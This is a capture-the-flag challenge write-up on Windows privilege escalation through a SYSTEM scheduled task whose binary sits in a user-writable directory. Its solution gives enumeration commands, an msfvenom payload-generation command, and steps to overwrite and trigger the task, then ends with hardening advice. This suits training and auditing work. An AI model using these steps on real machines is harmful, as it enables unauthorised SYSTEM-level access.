# Challenge 2 — Scheduled Task with Writable Binary

**Difficulty:** Medium
**Category:** Windows Privilege Escalation
**Flag:** `C:\CTF\challenge_task\flag.txt`

---

## Story

A sysadmin set up an automated cleanup task that runs every minute as SYSTEM.
It calls an executable they left in a directory with loose permissions.
You are `ctfplayer`. You have a minute.

---

## Setup

1. Start a **Windows VM**
2. Run PowerShell as Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

3. Log in as `ctfplayer` / `Player123!`

---

## Background: Scheduled Tasks

Windows Task Scheduler allows tasks to run under any account, including SYSTEM.
Unlike services (which restart automatically), scheduled tasks fire at predetermined
times. If a task runs a binary that a low-privileged user can overwrite, replacing
that binary is equivalent to replacing a service binary — except the trigger is time-based.

Enumeration tools to know: `schtasks`, `Get-ScheduledTask`, `accesschk.exe`.

---

## Hints

<details>
<summary>Hint 1</summary>
Enumerate scheduled tasks and look for ones running as SYSTEM:

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} |
    Select TaskName, @{N="Action";E={$_.Actions.Execute}}
```

Or with schtasks:
```cmd
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
```
</details>

<details>
<summary>Hint 2</summary>
Once you find the binary path, check your permissions on that directory:

```powershell
icacls "C:\Tasks\Cleanup"
```

If you have `(W)` write access, you can replace the binary.
</details>

<details>
<summary>Hint 3</summary>
Generate a replacement executable with msfvenom, transfer it, overwrite the original,
then wait up to one minute for the task to fire.

You can also trigger it manually if you have the right permissions:
```powershell
Start-ScheduledTask -TaskName "SystemCleanup"
```
</details>

---

## Solution

<details>
<summary>Click to reveal — try on your own first!</summary>

### Step 1 — Enumerate scheduled tasks

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} |
    Select TaskName, @{N="Action";E={$_.Actions.Execute}}
```

Output:
```
TaskName      Action
--------      ------
SystemCleanup C:\Tasks\Cleanup\cleanup.exe
```

### Step 2 — Confirm write permissions

```powershell
icacls "C:\Tasks\Cleanup"
```

Output includes: `ctfplayer:(W)` — we can write there.

### Step 3 — Generate and place the payload (on Kali)

```bash
msfvenom -p windows/x64/exec \
  CMD='cmd /c copy C:\CTF\challenge_task\flag.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F' \
  -f exe -o cleanup.exe
```

Transfer to the VM and overwrite:

```powershell
Copy-Item cleanup.exe "C:\Tasks\Cleanup\cleanup.exe" -Force
```

### Step 4 — Wait for the task or trigger it manually

```powershell
Start-ScheduledTask -TaskName "SystemCleanup"
```

### Step 5 — Read the flag

```powershell
type C:\Users\Public\flag.txt
```

```
CTF{t4sk_b1n_r3pl4c3d_by_pl4y3r}
```

### Why this works

Scheduled tasks running as SYSTEM are high-value targets during privilege escalation.
The critical mistake here is that the task binary resides in a directory writable by
non-privileged users. Task binaries and their parent directories should be owned by
Administrators with no write access for standard users. Use `icacls` or `accesschk.exe`
in audits to verify that no scheduled task binary is writable by unprivileged accounts.

</details>
